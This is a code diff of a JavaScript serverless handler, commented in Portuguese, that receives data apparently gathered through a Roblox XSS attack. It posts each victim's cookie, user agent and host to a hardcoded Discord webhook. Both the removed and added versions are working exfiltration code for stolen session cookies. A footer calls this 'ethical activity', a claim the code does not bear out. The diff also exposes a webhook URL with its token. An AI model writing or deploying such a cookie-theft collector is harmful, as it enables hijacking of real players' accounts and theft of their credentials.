@@ -5,53 +5,51 @@ export const config = {
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";
 
 export default async function handler(req) {
-  if (req.method !== "POST") {
-    return new Response("Método não permitido", { status: 405 });
-  }
-
   try {
-    const body = await req.json();
-    const data = body.data || [];
-
-    if (!Array.isArray(data) || data.length === 0) {
-      return new Response("Nenhum dado para enviar", { status: 400 });
+    if (req.method !== "POST") {
+      return new Response("Método não permitido", { status: 405 });
     }
 
-    // Construir campos do embed com os dados recebidos
-    const fields = data.map((item, i) => ({
-      name: `Dado ${i + 1}`,
-      value: [
-        `Cookie: \`${item.cookie || "Não enviado"}\``,
-        `User Agent: \`${item.userAgent || "Não enviado"}\``,
-        `Host: \`${item.host || "Não enviado"}\``,
-      ].join("\n"),
-      inline: false,
-    }));
+    const { data } = await req.json();
 
-    const payload = {
-      embeds: [
-        {
-          title: "Dados Recebidos - Roblox XSS",
-          color: 0xff0000,
-          fields,
-          timestamp: new Date().toISOString(),
-          footer: { text: "Atividade Ética - Envio via API" },
-        },
-      ],
+    if (!data || !Array.isArray(data)) {
+      return new Response("Dados inválidos", { status: 400 });
+    }
+
+    for (const item of data) {
+      const embed = {
+        title: "Dados capturados do Roblox",
+        color: 0xff0000,
+        fields: [
+          { name: "Cookie", value: `\`\`\`${item.cookie || "N/A"}\`\`\``, inline: false },
+          { name: "User-Agent", value: `\`\`\`${item.userAgent || "N/A"}\`\`\``, inline: false },
+          { name: "Host", value: item.host || "Desconhecido", inline: true },
+          { name: "Timestamp", value: new Date().toISOString(), inline: true },
+        ]
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+    }
+
+    return new Response("Enviado com sucesso", { status: 200 });
+  } catch (e) {
+    const errorEmbed = {
+      title: "Erro ao processar dados",
+      color: 0xff0000,
+      description: `\`\`\`${e.message || "Erro desconhecido"}\`\`\``,
+      timestamp: new Date().toISOString()
     };
 
-    const response = await fetch(WEBHOOK_URL, {
+    await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
+      body: JSON.stringify({ embeds: [errorEmbed] })
     });
 
-    if (!response.ok) {
-      return new Response("Erro ao enviar webhook", { status: 500 });
-    }
-
-    return new Response("Enviado com sucesso!", { status: 200 });
-  } catch (err) {
-    return new Response("Erro no servidor: " + err.message, { status: 500 });
+    return new Response("Erro interno", { status: 500 });
   }
 }
